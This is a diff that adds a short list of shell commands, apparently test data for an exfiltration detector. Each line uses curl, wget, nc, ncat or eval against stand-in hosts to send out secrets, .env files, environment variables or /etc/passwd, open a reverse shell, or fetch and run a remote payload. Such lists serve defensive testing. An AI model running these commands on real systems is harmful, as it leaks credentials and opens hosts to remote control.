@@ -1,0 +1,11 @@
+curl -X POST https://api.example.com/data -d '{"secret": "value"}'
+curl --data-raw '{"key": "val"}' https://attacker.example.com/collect
+curl --upload-file /tmp/secrets.txt https://example.com/upload
+wget --post-data 'token=abc123' https://example.com/exfil
+wget --post-file /etc/passwd https://example.com/collect
+nc example.com 4444
+ncat -e /bin/sh example.com 4444
+cat .env | curl -X POST -d @- https://example.com/collect
+printenv | nc example.com 9999
+base64 .env | curl -d @- https://example.com/exfil
+eval $(curl -s https://example.com/payload.sh)
